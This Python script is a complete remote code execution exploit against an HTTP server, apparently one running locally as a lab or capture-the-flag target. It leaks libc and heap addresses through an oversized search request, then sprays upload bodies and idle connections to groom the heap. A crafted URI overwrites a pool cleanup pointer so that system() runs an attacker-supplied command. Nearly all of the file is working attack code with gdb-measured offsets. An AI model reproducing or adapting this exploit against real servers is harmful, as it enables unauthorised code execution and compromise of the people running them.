import argparse, socket, struct, sys, time, os

HOST, PORT = "127.0.0.1", 19322
BODY_LEN = 4000
N_SPRAY  = 8

# leak (Debian glibc 2.41; mmap-sled fails, use the off-1729 libc-cluster ptr after churn) 
LIBC_OFF_SYSTEM = 0x53110
OFF_LIBC_LEAK   = 1729
OFF_LIBC_DELTA  = 0xb0ad08
OFF_HEAP_REF    = 1489
HEAP_REF_DELTA  = 0x28610
WARMUP          = 40

# rift geometry (gdb-measured on Debian release heap) 
N_PAD      = 9
K_ESC      = 1005
TARGET_OFF = N_PAD + 3*K_ESC          # = 0xbd0 = v->cleanup_field - S (fixpoint: S rises with URI len)
N_EMPTY    = 16                       # 16 empties evict the wedged conn pool so v lands close to S
CLEANUP_VAL_OFF = 0x1001f8            # v->pool->cleanup value = heap_base + this -> block heap+0x100000
CMD_HOLDER_OFF  = 0x28680             # spray #0 (cmd-holder) body lands here
REC_RUNS = [(0xe4ef0,167),(0xe7f20,167),(0xeb760,167),(0xeefa0,167),(0xf27e0,167),(0xf6020,167),
            (0xf9860,167),(0x100320,167),(0x103b60,167),(0x1073a0,167),(0x10abe0,167),(0x10e630,167),
            (0x112080,167),(0x115ad0,167),(0x119520,167),(0x11cf70,167),(0x1209c0,167),(0x124410,167),
            (0x127e60,167),(0x12b8b0,167),(0x12f300,167),(0x132d50,167),(0x1367a0,167),(0x13a1f0,167)]

SAFE = set()
_t = [0xffffffff,0xd800086d,0x50000000,0xb8000001,0xffffffff,0xffffffff,0xffffffff,0xffffffff]
for _b in range(256):
    if not (_t[_b>>5] & (1<<(_b&0x1f))): SAFE.add(_b)

def send_raw(req, t=6):
    s=socket.socket();s.settimeout(t);s.connect((HOST,PORT));s.sendall(req);ch=[]
    try:
        while True:
            d=s.recv(8192)
            if not d:break
            ch.append(d)
    except socket.timeout: pass
    s.close();return b"".join(ch)

def poolslip_leak():
    for _ in range(WARMUP):
        send_raw(b"GET /search/"+b"+"*300+b" HTTP/1.1\r\nHost:x\r\nConnection:close\r\n\r\n")
    resp=send_raw(b"GET /search/"+b"+"*350+b" HTTP/1.1\r\nHost:x\r\nConnection:close\r\n\r\n")
    h=resp.find(b"\r\n\r\n")
    if h<0:return b""
    body=resp[h+4:].rstrip(b"\n"); pre=b"Search temporarily unavailable. Query: "
    return body[len(pre):] if body.startswith(pre) else b""

def derive(args):
    if len(args)<OFF_LIBC_LEAK+8: return None,None
    lr=int.from_bytes(args[OFF_LIBC_LEAK:OFF_LIBC_LEAK+8],"little")
    hr=int.from_bytes(args[OFF_HEAP_REF:OFF_HEAP_REF+8],"little")
    if lr<0x100000000 or hr<0x100000000: return None,None
    return (lr+OFF_LIBC_DELTA)&~0xfff, hr-HEAP_REF_DELTA

def safe2(v): return (v&0xff) in SAFE and ((v>>8)&0xff) in SAFE

def pick_yyyy(heap_base):
    block=(heap_base+CLEANUP_VAL_OFF)&~0xffff; cl=heap_base+CLEANUP_VAL_OFF; cands=[]
    for run,cnt in REC_RUNS:
        for k in range(cnt):
            a=heap_base+run+24*k
            if block<=a<block+0x10000 and safe2(a&0xffff): cands.append(a)
    if not cands: return None
    cands.sort(key=lambda a:abs(a-cl)); return cands[0]&0xffff

def make_tiled(system_addr,cmd_ptr):
    return (struct.pack('<QQQ',system_addr,cmd_ptr,0)*(BODY_LEN//24+1))[:BODY_LEN]
def make_cmd(cmd):
    p=cmd.encode()+b'\x00'; return p+b'\x41'*(BODY_LEN-len(p))

def up(s,body):
    s.sendall(b"POST /api/upload HTTP/1.1\r\nHost: l\r\nContent-Length: "+str(BODY_LEN+1).encode()+
              b"\r\nConnection: keep-alive\r\n\r\n"); time.sleep(0.002); s.sendall(body)

SM = float(os.environ.get("SM", "1.0"))   # sleep multiplier (raise for more deterministic grooming)
def attempt(target_bytes, cmd_body, tiled_body):
    sprays=[]
    for i in range(N_SPRAY):
        try:
            s=socket.create_connection((HOST,PORT),timeout=5); up(s, cmd_body if i==0 else tiled_body); sprays.append(s)
        except Exception: break
        time.sleep(0.01*SM)
    time.sleep(0.5*SM)
    empties=[]
    for _ in range(N_EMPTY):
        try: empties.append(socket.create_connection((HOST,PORT),timeout=5))
        except Exception: pass
        time.sleep(0.004*SM)
    time.sleep(0.2*SM)
    try: a=socket.create_connection((HOST,PORT),timeout=5)
    except Exception:
        for s in sprays+empties:
            try:s.close()
            except:pass
        return False
    payload="A"*N_PAD+"+"*K_ESC+target_bytes.decode("latin-1")
    a.sendall((f"GET /api/v1/{payload} HTTP/1.1\r\nHost:l\r\n").encode("latin-1"))
    time.sleep(0.4*SM)
    for e in empties:
        try:e.close()
        except:pass
    time.sleep(0.3*SM) # let the empties' conn pools actually free
    try: v=socket.create_connection((HOST,PORT),timeout=5)
    except Exception:
        try:a.close()
        except:pass
        return False
    up(v,tiled_body); time.sleep(0.25*SM)
    postv=[]
    for _ in range(24):
        try:
            s=socket.create_connection((HOST,PORT),timeout=5); up(s,tiled_body); postv.append(s)
        except Exception: break
        time.sleep(0.004*SM)
    sprays.extend(postv); time.sleep(0.3*SM)
    a.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n"); time.sleep(0.4*SM)
    v.close(); time.sleep(0.2*SM)
    for s in sprays+[a]:
        try:s.close()
        except:pass
    return True

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--tries", type=int, default=12)
    a=ap.parse_args()
    args=poolslip_leak(); libc,heap=derive(args)
    if not libc or not heap: print("[!] leak failed"); return 1
    system=libc+LIBC_OFF_SYSTEM; cmd_ptr=heap+CMD_HOLDER_OFF; yy=pick_yyyy(heap)
    if yy is None: print("[!] no URL-safe tiled record in the cleanup block for this base"); return 2
    block=(heap+CLEANUP_VAL_OFF)&~0xffff
    print("[*] libc=0x%x system=0x%x heap_base=0x%x"%(libc,system,heap))
    print("[*] cleanup block=0x%x  redirect low2=0x%04x -> 0x%x  cmd@0x%x"%(block,yy,block|yy,cmd_ptr))
    tgt=bytes([yy&0xff,(yy>>8)&0xff]); cb=make_cmd(a.cmd); tb=make_tiled(system,cmd_ptr)
    for t in range(a.tries):
        if attempt(tgt,cb,tb):
            return 0
        time.sleep(0.3)
    print("[-] no fire"); return 0

if __name__=="__main__": sys.exit(main())
